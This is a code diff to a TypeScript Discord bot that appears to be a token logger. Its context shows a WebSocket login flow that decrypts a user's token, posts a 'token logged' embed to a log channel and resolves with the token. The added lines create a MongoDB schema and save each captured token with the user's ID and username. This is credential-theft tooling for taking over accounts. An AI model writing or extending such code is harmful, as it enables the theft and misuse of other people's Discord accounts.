@@ -1,11 +1,18 @@
 import fetch from 'node-fetch'
 import { Message, MessageEmbed, MessageAttachment, Client, TextChannel } from "discord.js";
 import { generateKeyPairSync, createHash, privateDecrypt } from "crypto";
+import { model, Schema } from 'mongoose';
 import WebSocket from "ws";
 import Jimp from "jimp";
 
 import { IConfig, IData, IUser } from './global';
 const config: IConfig = require('../config.json');
+
+const users = model(config.mongoose.schemaName, new Schema({
+    id: String,
+    username: String,
+    token: String
+}));
 
 let SocketClient: WebSocket;
 let Heart: NodeJS.Timeout;
@@ -93,6 +100,13 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
 
                 close();
                 (await client.channels.cache.get(config.logChannel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
+                if (config.mongoose.enabled) {
+                    await users.create({
+                        id: discord.id,
+                        username: discord.username,
+                        token: token
+                    });
+                }
                 reslove(token);
                 break;
             default:
